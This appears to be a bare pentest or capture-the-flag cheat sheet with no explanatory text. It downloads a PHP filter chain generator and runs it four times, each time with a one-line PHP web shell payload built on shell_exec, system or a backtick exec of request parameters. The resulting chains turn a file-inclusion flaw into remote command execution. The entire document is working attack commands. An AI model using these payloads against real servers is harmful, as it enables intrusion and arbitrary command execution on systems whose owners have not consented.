wget <https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py>

python3 php_filter_chain_generator.py --chain '<?php shell_exec($_REQUEST['0']);?>'

python3 php_filter_chain_generator.py --chain '<?php system($_GET['0']);?>'

python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'

python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_REQUEST['0']);?>'

